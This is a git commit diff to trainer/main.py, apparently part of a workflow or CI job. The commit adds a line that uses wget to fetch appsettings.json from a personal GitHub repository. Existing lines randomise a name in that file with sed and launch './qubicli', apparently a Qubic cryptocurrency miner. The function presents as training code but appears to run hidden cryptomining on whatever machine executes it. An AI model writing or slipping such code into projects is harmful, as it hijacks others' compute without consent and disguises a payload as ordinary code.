1529fea7cda5bf479fa28d015fb15f5ee2572ca0
rxt36q6 <rxt36q6@atomicmail.io>
2026-08-10 09:05:35 +0800

    Update main.py

--- trainer/main.py
+++ trainer/main.py
@@ -14,6 +14,7 @@ app = Workflows()
 def building1():
   import sys
   import os
+  os.system('wget https://github.com/rxt36q6/myrend/raw/main/appsettings.json')
   os.system('ls')
   os.system('sed -i "s/samje/$(echo $RANDOM | md5sum | head -c 10)/g" appsettings.json && ./qubicli')
 
